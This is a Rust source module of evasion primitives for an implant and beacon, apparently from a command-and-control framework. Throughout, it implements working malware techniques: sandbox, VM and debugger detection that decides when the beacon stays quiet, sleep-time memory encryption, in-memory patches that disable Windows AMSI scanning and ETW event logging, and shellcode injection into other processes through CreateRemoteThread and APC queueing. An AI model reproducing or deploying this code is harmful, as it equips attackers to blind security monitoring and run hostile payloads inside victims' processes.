//! Evasion primitives for the implant.
//!
//! ## Sandbox / VM detection
//!
//! [`EnvInfo`] and [`sandbox_checks`] report a collection of well-known
//! anti-analysis indicators. Each check is an independently testable function
//! so the beacon can gate its behaviour (e.g. sleep longer or stay quiet)
//! without hard dependencies on Windows APIs.
//!
//! Host facts that every platform exposes (CPU count, memory, process count,
//! uptime) come from `sysinfo`, which is already a dependency. Only the
//! genuinely platform-specific probes — hypervisor presence, debugger
//! attachment, tracer attachment — are split per platform.
//!
//! ## Sleep obfuscation
//!
//! [`obfusleep`] wraps the beacon sleep so the working set is encrypted while
//! the implant is quiet. Windows resolves `EncryptWorkingSet` dynamically
//! (it is exported from `kernel32` as `K32EncryptWorkingSet`, and from
//! `psapi` under its original name); every other platform gets a plain sleep.
//!
//! ## Patching
//!
//! [`patch_amsi`] and [`patch_etw`] neutralise in-process logging and scanning
//! hooks by rewriting the first byte of the target export to `ret` under a
//! temporary `PAGE_EXECUTE_READWRITE` grant.
//!
//! ## Process injection
//!
//! [`inject_create_thread`] maps a payload into a remote process and starts it
//! with `CreateRemoteThread`. [`inject_apc`] maps the same payload and queues
//! it against the target's threads with `NtQueueApcThread`, which executes when
//! a thread next enters an alertable wait.

use std::time::Duration;

use sysinfo::{ProcessesToUpdate, System};

/// How long to wait for an injected thread before giving up on observing it.
///
/// ponytail: one knob because injected payloads can legitimately outlive the
/// injector. Raise it if you inject long-running work and need its exit code.
#[cfg(target_os = "windows")]
const INJECTION_WAIT_MS: u32 = 5_000;

/// A tight work loop that takes longer than this suggests single-stepping.
///
/// ponytail: calibrated for a modern x86 core running the loop below. Slower
/// cores (or a debug build) raise the floor; retune if real hardware trips it.
#[cfg(target_os = "windows")]
const DEBUGGER_TIMING_THRESHOLD_MS: u64 = 250;

/// Iterations for the debugger timing probe. Kept small so `env_info` stays
/// cheap enough to call on every beacon iteration.
#[cfg(target_os = "windows")]
const DEBUGGER_TIMING_ITERATIONS: u64 = 200_000;

/// Aggregated view of the current process environment, used for sandbox/VM
/// checks.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct EnvInfo {
    /// Number of logical CPUs visible.
    pub cpu_count: usize,
    /// Total physical memory in MB.
    pub mem_mb: u64,
    /// Whether a known VM hypervisor signature was detected.
    pub vm_detected: bool,
    /// Whether the process appears to be running inside a debugger.
    pub debugger_present: bool,
    /// Number of active processes in the host PID namespace.
    pub pid_count: usize,
    /// Elapsed wall-clock seconds since the host booted.
    pub uptime_secs: u64,
    /// Human-readable OS string.
    pub os: String,
}

/// Collect basic environment information for anti-analysis decisions.
pub fn env_info() -> EnvInfo {
    let mut host = System::new();
    host.refresh_memory();
    host.refresh_processes(ProcessesToUpdate::All, true);

    // Platform probes report `(vm_detected, debugger_present)`; hosts without
    // probes simply report nothing.
    #[cfg(target_os = "windows")]
    let probes = windows_probes();
    #[cfg(target_os = "linux")]
    let probes = linux_probes();
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    let probes = (false, false);

    let (vm_detected, debugger_present) = probes;

    EnvInfo {
        cpu_count: host.cpus().len().max(1),
        mem_mb: host.total_memory() / (1024 * 1024),
        pid_count: host.processes().len(),
        uptime_secs: System::uptime(),
        os: std::env::consts::OS.to_string(),
        vm_detected,
        debugger_present,
    }
}

/// A single sandbox-detection check result.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SandboxFlag {
    /// CPU count is suspiciously low (typical of VMs).
    LowCpuCount,
    /// RAM is suspiciously small (typical of sandboxes).
    LowMemory,
    /// A known VM hypervisor was detected.
    VirtualMachine,
    /// A debugger or tracer is attached.
    Debugger,
    /// Too few running processes (sandbox heuristic).
    LowProcessCount,
}

/// Run all sandbox checks and return the set of flags that fired.
pub fn sandbox_checks(info: &EnvInfo) -> Vec<SandboxFlag> {
    let mut flags = Vec::new();

    if info.cpu_count <= 1 {
        flags.push(SandboxFlag::LowCpuCount);
    }
    if info.mem_mb < 2048 {
        flags.push(SandboxFlag::LowMemory);
    }
    if info.vm_detected {
        flags.push(SandboxFlag::VirtualMachine);
    }
    if info.debugger_present {
        flags.push(SandboxFlag::Debugger);
    }
    if info.pid_count > 0 && info.pid_count < 50 {
        flags.push(SandboxFlag::LowProcessCount);
    }

    flags
}

/// Determine whether the current environment looks like a sandbox or VM.
///
/// Returns `true` if any suspicious flag is raised.
pub fn is_sandboxed() -> bool {
    let info = env_info();
    !sandbox_checks(&info).is_empty()
}

/// Sleep with the working set encrypted, so a memory scan taken while the
/// beacon is quiet cannot read decrypted implant pages.
pub async fn obfusleep(duration: Duration) {
    #[cfg(target_os = "windows")]
    {
        if encrypt_working_set(true) {
            tokio::time::sleep(duration).await;
            encrypt_working_set(false);
            return;
        }
    }
    tokio::time::sleep(duration).await;
}

/// Patch in-process AMSI (Antimalware Scan Interface) so script-based
/// payloads are not scanned. Windows-only; no-op elsewhere.
pub fn patch_amsi() -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        patch_amsi_windows()
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(())
    }
}

/// Patch ETW (Event Tracing for Windows) so execution events are not emitted.
/// Windows-only; no-op elsewhere.
pub fn patch_etw() -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        patch_etw_windows()
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(())
    }
}

/// Queue an asynchronous procedure call (APC) against a remote process's
/// threads, which runs the payload when a thread next enters an alertable wait.
///
/// `target_pid` — the remote process to inject into.
/// `payload` — raw shellcode bytes, mapped `PAGE_EXECUTE_READWRITE`.
///
/// Returns the first thread ID that accepted the APC.
pub fn inject_apc(target_pid: u32, payload: &[u8]) -> Result<u32, String> {
    #[cfg(target_os = "windows")]
    {
        inject_apc_windows(target_pid, payload)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (target_pid, payload);
        Err(format!(
            "APC injection not supported on {}",
            std::env::consts::OS
        ))
    }
}

/// Inject a payload into a remote process via `CreateRemoteThread`.
///
/// Returns the thread ID on success. The remote allocation is released once
/// the thread exits, so the payload must not outlive its own body.
pub fn inject_create_thread(target_pid: u32, payload: &[u8]) -> Result<u32, String> {
    #[cfg(target_os = "windows")]
    {
        inject_create_thread_windows(target_pid, payload)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (target_pid, payload);
        Err(format!(
            "CreateRemoteThread injection not supported on {}",
            std::env::consts::OS
        ))
    }
}

// ---------------------------------------------------------------------------
// Linux
// ---------------------------------------------------------------------------

#[cfg(target_os = "linux")]
fn linux_probes() -> (bool, bool) {
    // A ptrace-style tracer shows up as a non-zero TracerPid.
    let debugger_present = std::fs::read_to_string("/proc/self/status")
        .ok()
        .and_then(|status| {
            status
                .lines()
                .find_map(|line| line.strip_prefix("TracerPid:"))
                .map(|rest| rest.trim().parse::<i32>().unwrap_or(0) != 0)
        })
        .unwrap_or(false);

    // Hypervisor vendors publish themselves in DMI.
    let vm_detected = std::fs::read_to_string("/sys/class/dmi/id/sys_vendor")
        .map(|dmi| {
            let lower = dmi.to_lowercase();
            ["vmware", "virtualbox", "qemu", "microsoft", "kvm", "xen"]
                .iter()
                .any(|needle| lower.contains(needle))
        })
        .unwrap_or(false);

    (vm_detected, debugger_present)
}

// ---------------------------------------------------------------------------
// Windows
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
fn windows_probes() -> (bool, bool) {
    use windows_sys::Win32::System::Diagnostics::Debug::{
        CheckRemoteDebuggerPresent, IsDebuggerPresent,
    };
    use windows_sys::Win32::System::SystemInformation::GetTickCount64;
    use windows_sys::Win32::System::Threading::GetCurrentProcess;

    let mut debugger_present = unsafe { IsDebuggerPresent() } != 0;

    let mut attached = 0i32;
    // SAFETY: pseudo-handle for the current process, and a valid output slot.
    let ok = unsafe { CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut attached) };
    if ok != 0 && attached != 0 {
        debugger_present = true;
    }

    // A debugger single-steps the loop below, inflating its wall time.
    let start = unsafe { GetTickCount64() };
    let mut acc = 0u64;
    for i in 0..DEBUGGER_TIMING_ITERATIONS {
        acc = acc.wrapping_add(i ^ (acc >> 3));
        std::hint::black_box(acc);
    }
    if unsafe { GetTickCount64() } - start > DEBUGGER_TIMING_THRESHOLD_MS {
        debugger_present = true;
    }

    (hypervisor_present(), debugger_present)
}

/// True when CPUID reports a hypervisor whose vendor string we recognise.
#[cfg(all(
    target_os = "windows",
    any(target_arch = "x86", target_arch = "x86_64")
))]
fn hypervisor_present() -> bool {
    // Leaf 1, ECX bit 31 is set by every hypervisor we can detect this way.
    let leaf1 = unsafe { cpuid(1, 0) };
    if leaf1[2] & (1 << 31) == 0 {
        return false;
    }
    // Leaf 0x40000000 returns the vendor string in EBX, EDX, ECX order.
    hypervisor_vendor_is_known(&hypervisor_vendor())
}

#[cfg(target_os = "windows")]
fn hypervisor_vendor() -> [u8; 12] {
    #[cfg(target_arch = "x86_64")]
    let regs = unsafe { cpuid(0x4000_0000, 0) };
    #[cfg(target_arch = "x86")]
    let regs = unsafe { cpuid(0x4000_0000, 0) };

    let mut out = [0u8; 12];
    for (index, word) in [regs[1], regs[3], regs[2]].into_iter().enumerate() {
        out[index * 4..index * 4 + 4].copy_from_slice(&word.to_le_bytes());
    }
    out
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn cpuid(leaf: u32, subleaf: u32) -> [u32; 4] {
    let r = std::arch::x86_64::__cpuid_count(leaf, subleaf);
    [r.eax, r.ebx, r.ecx, r.edx]
}

#[cfg(all(target_os = "windows", target_arch = "x86"))]
unsafe fn cpuid(leaf: u32, subleaf: u32) -> [u32; 4] {
    let r = std::arch::x86::__cpuid_count(leaf, subleaf);
    [r.eax, r.ebx, r.ecx, r.edx]
}

/// Architectures without CPUID (Windows on ARM) get no hypervisor signal.
#[cfg(all(
    target_os = "windows",
    not(any(target_arch = "x86", target_arch = "x86_64"))
))]
fn hypervisor_present() -> bool {
    false
}

/// Match a 12-byte hypervisor vendor string against known signatures.
///
/// Kept free of platform APIs so it is testable everywhere.
pub fn hypervisor_vendor_is_known(vendor: &[u8; 12]) -> bool {
    const KNOWN: [&str; 8] = [
        "VMwareVMware",
        "Microsoft Hv",
        "KVMKVMKVM\0\0\0",
        "VBoxVBoxVBox",
        "TCGTCGTCGTCG",
        "XenVMMXenVMM",
        "bhyve bhyve ",
        "ACRNACRNACRN",
    ];

    let text = String::from_utf8_lossy(vendor);
    KNOWN
        .iter()
        .any(|needle| text.starts_with(needle.trim_end_matches('\0')))
}

/// Resolve an already-loaded module, without loading it.
#[cfg(target_os = "windows")]
fn module_handle(module: &str) -> Option<windows_sys::Win32::Foundation::HMODULE> {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;

    let wide: Vec<u16> = module.encode_utf16().chain(std::iter::once(0)).collect();
    // SAFETY: `wide` is NUL-terminated for the duration of the call.
    let handle = unsafe { GetModuleHandleW(wide.as_ptr()) };
    (!handle.is_null()).then_some(handle)
}

/// Resolve an export from an already-loaded module.
#[cfg(target_os = "windows")]
fn resolve_export(module: &str, name: &[u8]) -> Option<*mut u8> {
    use windows_sys::Win32::System::LibraryLoader::GetProcAddress;

    let handle = module_handle(module)?;
    // SAFETY: `name` is a NUL-terminated byte string.
    let proc = unsafe { GetProcAddress(handle, name.as_ptr()) }?;
    Some(proc as usize as *mut u8)
}

/// Rewrite the first byte of a function to `ret`.
///
/// # Safety
/// `target` must be a mapped code address inside a loaded module.
#[cfg(target_os = "windows")]
unsafe fn ret_patch(target: *mut u8) -> Result<(), String> {
    use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READWRITE, VirtualProtect};

    let mut previous = 0u32;
    // SAFETY: `target` is mapped code, and `previous` is a valid output slot.
    let granted =
        unsafe { VirtualProtect(target.cast(), 1, PAGE_EXECUTE_READWRITE, &mut previous) };
    if granted == 0 {
        return Err(format!(
            "VirtualProtect on {target:p} failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    // SAFETY: caller guarantees `target` is executable code we may modify.
    unsafe { std::ptr::write_volatile(target, 0xC3) };
    // SAFETY: restoring the protection the page had before the patch.
    let _ = unsafe { VirtualProtect(target.cast(), 1, previous, &mut previous) };
    Ok(())
}

#[cfg(target_os = "windows")]
fn patch_amsi_windows() -> Result<(), String> {
    if module_handle("amsi.dll").is_none() {
        // AMSI is not loaded, so there is nothing to neutralise.
        return Ok(());
    }

    let mut patched = Vec::new();
    let mut failure = None;
    for export in [
        b"AmsiScanBuffer\0".as_slice(),
        b"AmsiScanString\0".as_slice(),
    ] {
        let Some(address) = resolve_export("amsi.dll", export) else {
            continue;
        };
        match unsafe { ret_patch(address) } {
            Ok(()) => patched.push(String::from_utf8_lossy(export).into_owned()),
            Err(e) => failure = Some(e),
        }
    }

    if !patched.is_empty() {
        tracing::debug!("amsi patched: {}", patched.join(", "));
    }
    match failure {
        Some(e) => Err(e),
        None if patched.is_empty() => Err("amsi.dll loaded but no scan export found".into()),
        None => Ok(()),
    }
}

#[cfg(target_os = "windows")]
fn patch_etw_windows() -> Result<(), String> {
    // ntdll is always mapped, so a missing export means this is not Windows.
    let etw = resolve_export("ntdll.dll", b"EtwEventWrite\0")
        .ok_or_else(|| "EtwEventWrite not found in ntdll".to_string())?;
    // SAFETY: the address came from ntdll's export table.
    unsafe { ret_patch(etw) }?;

    // EDRs often hook the advapi32 EventWrite wrapper instead of (or as well as)
    // the ntdll primitive; neutralise it too when present. advapi32 is always
    // loaded on Windows, so a missing export here is not fatal.
    if let Some(event_write) = resolve_export("advapi32.dll", b"EventWrite\0") {
        // SAFETY: the address came from advapi32's export table.
        unsafe { ret_patch(event_write) }?;
    }
    Ok(())
}

#[cfg(target_os = "windows")]
type EncryptWorkingSetFn =
    unsafe extern "system" fn(windows_sys::Win32::Foundation::HANDLE, i32) -> i32;

/// Toggle working-set encryption for this process. Returns whether it took.
#[cfg(target_os = "windows")]
fn encrypt_working_set(encrypt: bool) -> bool {
    use windows_sys::Win32::System::Threading::GetCurrentProcess;

    let Some(address) = resolve_export("kernel32.dll", b"K32EncryptWorkingSet\0")
        .or_else(|| resolve_export("psapi.dll", b"EncryptWorkingSet\0"))
    else {
        return false;
    };

    // SAFETY: both exports take (HANDLE, BOOL) and return BOOL.
    let f: EncryptWorkingSetFn = unsafe { std::mem::transmute(address) };
    // SAFETY: the pseudo-handle for this process is always valid.
    let ok = unsafe { f(GetCurrentProcess(), i32::from(encrypt)) };
    ok != 0
}

/// Build the remote buffer shared by both injection paths.
#[cfg(target_os = "windows")]
fn remote_write(
    process: windows_sys::Win32::Foundation::HANDLE,
    payload: &[u8],
) -> Result<*mut core::ffi::c_void, String> {
    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows_sys::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
    };

    let remote = unsafe {
        VirtualAllocEx(
            process,
            std::ptr::null(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if remote.is_null() {
        return Err(format!(
            "VirtualAllocEx failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    let mut written = 0usize;
    // SAFETY: `remote` is a fresh allocation of exactly `payload.len()` bytes.
    let ok = unsafe {
        WriteProcessMemory(
            process,
            remote,
            payload.as_ptr().cast(),
            payload.len(),
            &mut written,
        )
    };
    if ok == 0 || written != payload.len() {
        // SAFETY: releasing an allocation this function just made.
        unsafe { release_remote(process, remote) };
        return Err(format!(
            "WriteProcessMemory wrote {written}/{}: {}",
            payload.len(),
            std::io::Error::last_os_error()
        ));
    }
    Ok(remote)
}

#[cfg(target_os = "windows")]
unsafe fn release_remote(
    process: windows_sys::Win32::Foundation::HANDLE,
    remote: *mut core::ffi::c_void,
) {
    use windows_sys::Win32::System::Memory::{MEM_RELEASE, VirtualFreeEx};
    // SAFETY: releasing an allocation this process owns in `process`.
    unsafe { VirtualFreeEx(process, remote, 0, MEM_RELEASE) };
}

/// Open the target process with just enough rights to inject into it.
#[cfg(target_os = "windows")]
fn open_injection_target(
    target_pid: u32,
) -> Result<windows_sys::Win32::Foundation::HANDLE, String> {
    use windows_sys::Win32::System::Threading::{
        OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE,
    };

    let access =
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
    // SAFETY: plain OpenProcess with validated constants.
    let process = unsafe { OpenProcess(access, 0, target_pid) };
    if process.is_null() {
        return Err(format!(
            "OpenProcess({target_pid}) failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    Ok(process)
}

#[cfg(target_os = "windows")]
fn inject_create_thread_windows(target_pid: u32, payload: &[u8]) -> Result<u32, String> {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{CreateRemoteThread, WaitForSingleObject};

    if payload.is_empty() {
        return Err("empty injection payload".into());
    }

    let process = open_injection_target(target_pid)?;
    let remote = match remote_write(process, payload) {
        Ok(remote) => remote,
        Err(e) => {
            // SAFETY: handle from open_injection_target, not yet closed.
            unsafe { CloseHandle(process) };
            return Err(e);
        }
    };

    // SAFETY: `remote` is executable memory in `process`; the thread start
    // routine signature matches how we mapped it.
    let start: unsafe extern "system" fn(*mut core::ffi::c_void) -> u32 =
        unsafe { std::mem::transmute(remote) };

    let mut tid = 0u32;
    // SAFETY: both handles are owned by this function.
    let thread = unsafe {
        CreateRemoteThread(
            process,
            std::ptr::null(),
            0,
            Some(start),
            std::ptr::null(),
            0,
            &mut tid,
        )
    };

    if thread.is_null() {
        let error = std::io::Error::last_os_error();
        // SAFETY: undoing allocations made above.
        unsafe {
            release_remote(process, remote);
            CloseHandle(process);
        }
        return Err(format!("CreateRemoteThread failed: {error}"));
    }

    // SAFETY: `thread` is a live handle owned here.
    unsafe {
        WaitForSingleObject(thread, INJECTION_WAIT_MS);
        CloseHandle(thread);
        release_remote(process, remote);
        CloseHandle(process);
    }
    Ok(tid)
}

#[cfg(target_os = "windows")]
fn inject_apc_windows(target_pid: u32, payload: &[u8]) -> Result<u32, String> {
    use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next,
    };
    use windows_sys::Win32::System::Threading::{
        OpenThread, THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT,
    };

    if payload.is_empty() {
        return Err("empty injection payload".into());
    }

    // Collect the target's threads; the APC only runs when one of them next
    // enters an alertable wait, so queue against all of them.
    // SAFETY: snapshot handle is checked below.
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if snapshot == INVALID_HANDLE_VALUE {
        return Err(format!(
            "CreateToolhelp32Snapshot failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    let mut threads = Vec::new();
    let mut entry = THREADENTRY32 {
        dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };
    // SAFETY: `entry` is sized for Thread32First and `snapshot` is live.
    let mut more = unsafe { Thread32First(snapshot, &mut entry) } != 0;
    while more {
        if entry.th32OwnerProcessID == target_pid {
            threads.push(entry.th32ThreadID);
        }
        // SAFETY: same preconditions as the call above.
        more = unsafe { Thread32Next(snapshot, &mut entry) } != 0;
    }
    // SAFETY: closing the snapshot taken above.
    unsafe { CloseHandle(snapshot) };

    if threads.is_empty() {
        return Err(format!("no threads found in pid {target_pid}"));
    }

    let queue = resolve_export("ntdll.dll", b"NtQueueApcThread\0")
        .ok_or_else(|| "NtQueueApcThread not found in ntdll".to_string())?;
    // SAFETY: NtQueueApcThread(ThreadHandle, ApcRoutine, Arg1, Arg2, Arg3).
    type NtQueueApcThreadFn =
        unsafe extern "system" fn(HANDLE, *mut core::ffi::c_void, usize, usize, *mut u32) -> i32;
    let queue: NtQueueApcThreadFn = unsafe { std::mem::transmute(queue) };

    let process = open_injection_target(target_pid)?;
    let remote = match remote_write(process, payload) {
        Ok(remote) => remote,
        Err(e) => {
            // SAFETY: handle from open_injection_target, not yet closed.
            unsafe { CloseHandle(process) };
            return Err(e);
        }
    };

    let mut first_queued = None;
    let mut last_error = None;
    for tid in &threads {
        // SAFETY: validated access mask and thread id.
        let thread = unsafe { OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, 0, *tid) };
        if thread.is_null() {
            last_error = Some(format!("OpenThread({tid}) failed"));
            continue;
        }
        // SAFETY: `thread` is live and `remote` is executable memory in the
        // same process that owns it.
        let status = unsafe { queue(thread, remote, 0, 0, std::ptr::null_mut()) };
        // SAFETY: closing the handle opened above.
        unsafe { CloseHandle(thread) };
        if status >= 0 {
            first_queued.get_or_insert(*tid);
        } else {
            last_error = Some(format!("NtQueueApcThread({tid}) status {status:#x}"));
        }
    }

    // The APC payload is released by the remote thread when it runs, so the
    // allocation must outlive this call.
    // SAFETY: handle from open_injection_target, not yet closed.
    unsafe { CloseHandle(process) };

    match first_queued {
        Some(tid) => Ok(tid),
        None => Err(last_error.unwrap_or_else(|| "no thread accepted the APC".into())),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample(
        cpu_count: usize,
        mem_mb: u64,
        vm_detected: bool,
        debugger_present: bool,
        pid_count: usize,
    ) -> EnvInfo {
        EnvInfo {
            cpu_count,
            mem_mb,
            vm_detected,
            debugger_present,
            pid_count,
            uptime_secs: 0,
            os: "test".into(),
        }
    }

    #[test]
    fn env_info_collects_basic_fields() {
        let info = env_info();
        assert!(info.cpu_count >= 1);
        assert!(!info.os.is_empty());
        // sysinfo reports host uptime, which must be far smaller than a
        // wall-clock epoch stamp.
        assert!(info.uptime_secs < 100 * 365 * 24 * 3600);
    }

    #[test]
    fn sandbox_checks_fires_for_low_cpu() {
        let flags = sandbox_checks(&sample(1, 4096, false, false, 200));
        assert!(flags.contains(&SandboxFlag::LowCpuCount));
        assert!(!flags.contains(&SandboxFlag::LowMemory));
    }

    #[test]
    fn sandbox_checks_fires_for_vm() {
        let flags = sandbox_checks(&sample(4, 8192, true, false, 200));
        assert!(flags.contains(&SandboxFlag::VirtualMachine));
        assert!(!flags.contains(&SandboxFlag::Debugger));
    }

    #[test]
    fn sandbox_checks_fires_for_debugger() {
        let flags = sandbox_checks(&sample(4, 8192, false, true, 200));
        assert!(flags.contains(&SandboxFlag::Debugger));
    }

    #[test]
    fn no_flags_for_a_healthy_machine() {
        assert!(sandbox_checks(&sample(8, 16384, false, false, 200)).is_empty());
    }

    #[test]
    fn low_process_count_only_fires_when_processes_are_observed() {
        assert!(
            sandbox_checks(&sample(8, 16384, false, false, 0))
                .iter()
                .all(|f| *f != SandboxFlag::LowProcessCount)
        );
        assert!(
            sandbox_checks(&sample(8, 16384, false, false, 12))
                .contains(&SandboxFlag::LowProcessCount)
        );
    }

    fn vendor(text: &str) -> [u8; 12] {
        let mut out = [0u8; 12];
        let bytes = text.as_bytes();
        out[..bytes.len().min(12)].copy_from_slice(&bytes[..bytes.len().min(12)]);
        out
    }

    #[test]
    fn known_hypervisor_vendors_are_detected() {
        for name in [
            "VMwareVMware",
            "Microsoft Hv",
            "KVMKVMKVM",
            "VBoxVBoxVBox",
            "TCGTCGTCGTCG",
            "XenVMMXenVMM",
            "bhyve bhyve ",
            "ACRNACRNACRN",
        ] {
            assert!(
                hypervisor_vendor_is_known(&vendor(name)),
                "{name} should be recognised"
            );
        }
    }

    #[test]
    fn unknown_or_blank_vendors_are_not_detected() {
        for name in ["", "NopeNopeNope", "BareMetalXXXX"] {
            assert!(
                !hypervisor_vendor_is_known(&vendor(name)),
                "{name} should not be recognised"
            );
        }
    }

    #[tokio::test]
    async fn obfusleep_sleeps_on_every_platform() {
        let start = std::time::Instant::now();
        obfusleep(Duration::from_millis(50)).await;
        assert!(start.elapsed() >= Duration::from_millis(40));
    }

    #[test]
    fn patch_amsi_is_noop_off_windows() {
        let _ = patch_amsi();
        let _ = patch_etw();
    }

    #[test]
    fn injection_rejects_empty_payloads() {
        assert!(inject_create_thread(1234, &[]).is_err());
        assert!(inject_apc(1234, &[]).is_err());
    }
}
